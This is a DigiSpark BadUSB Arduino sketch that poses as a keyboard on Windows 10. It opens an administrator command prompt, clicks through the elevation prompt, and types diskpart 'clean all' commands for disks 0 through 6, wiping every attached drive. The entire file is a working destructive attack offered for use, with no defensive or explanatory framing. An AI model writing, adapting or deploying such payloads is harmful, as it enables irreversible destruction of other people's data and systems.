//This DigiSpark script to delete all hard disk partitions
//Tested on Windows 10 with English(US) keyboard layout
//Created by Шпион америка | Edited by Шпион америка

#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("diskpart");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("list disk");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("select disk 1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("clean all");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("select disk 2");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("clean all");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("select disk 3");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("clean all");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("select disk 4");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("clean all");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("select disk 5");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("clean all");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("select disk 6");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("clean all");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("select disk 0");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("clean all");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}
